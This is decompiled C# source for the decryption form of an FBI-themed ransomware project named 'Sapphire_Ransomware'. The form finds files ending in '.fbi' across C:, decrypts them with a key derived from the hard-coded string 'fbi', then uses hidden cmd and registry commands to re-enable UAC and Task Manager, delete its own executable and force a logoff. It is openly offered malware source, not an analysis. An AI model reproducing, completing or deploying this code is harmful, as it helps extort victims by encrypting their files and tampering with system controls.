using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Sapphire_Ransomware.My;

namespace Sapphire_Ransomware;

[DesignerGenerated]
public class Form3 : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("ListBox1")]
	internal virtual ListBox ListBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Timer2")]
	internal virtual Timer Timer2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form3()
	{
		((Form)this).add_Load((EventHandler)Form3_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fe: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form3));
		ListBox1 = new ListBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		ProgressBar1 = new ProgressBar();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		((Control)ListBox1).set_Location(new Point(12, 28));
		((Control)ListBox1).set_Name("ListBox1");
		((Control)ListBox1).set_Size(new Size(560, 186));
		((Control)ListBox1).set_TabIndex(0);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Location(new Point(13, 9));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(274, 13));
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("God bless america, we are decrypting files... Please wait!");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Location(new Point(13, 266));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(61, 13));
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text("Decrypting:");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Location(new Point(110, 266));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(39, 13));
		((Control)Label3).set_TabIndex(3);
		Label3.set_Text("Label3");
		((Control)ProgressBar1).set_Location(new Point(12, 220));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(561, 34));
		((Control)ProgressBar1).set_TabIndex(4);
		Timer1.set_Enabled(true);
		Timer2.set_Enabled(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(585, 297));
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form3");
		((Form)this).set_Text("FBI Decryption");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		ProgressBar1.set_Maximum(ListBox1.get_Items().get_Count());
		if (ProgressBar1.get_Value() == ListBox1.get_Items().get_Count())
		{
			Timer1.Stop();
			Interaction.Shell("cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f", (AppWinStyle)2, false, -1);
			NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", "")), (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, true);
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.get_ExecutablePath(),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 10 logoff",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Interaction.Shell("cmd /c choice /C Y /N /D Y /T 10 & logoff", (AppWinStyle)2, false, -1);
			Interaction.Shell("ping google.com & ping google.com & logoff", (AppWinStyle)2, false, -1);
			Application.Exit();
			Application.ExitThread();
		}
		else
		{
			ListBox1.set_SelectedIndex(ProgressBar1.get_Value());
			ListBox1.set_SelectionMode((SelectionMode)1);
			string text = Conversions.ToString(ListBox1.get_SelectedItem());
			try
			{
				byte[] bytKey = MyProject.Forms.Form1.CreateKey("fbi");
				byte[] bytIV = MyProject.Forms.Form1.CreateIV("fbi");
				string strOutputFile = Strings.Replace(text, ".fbi", "", 1, -1, (CompareMethod)0);
				MyProject.Forms.Form1.EncryptOrDecryptFile(text, strOutputFile, bytKey, bytIV, Form1.CryptoAction.ActionDecrypt);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			ProgressBar1.Increment(1);
			Label2.set_Text(text);
		}
	}

	private void Form3_Load(object sender, EventArgs e)
	{
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:", (SearchOption)3, new string[0]))
		{
			if (file.EndsWith(".fbi"))
			{
				ListBox1.get_Items().Add((object)file);
			}
		}
	}
}
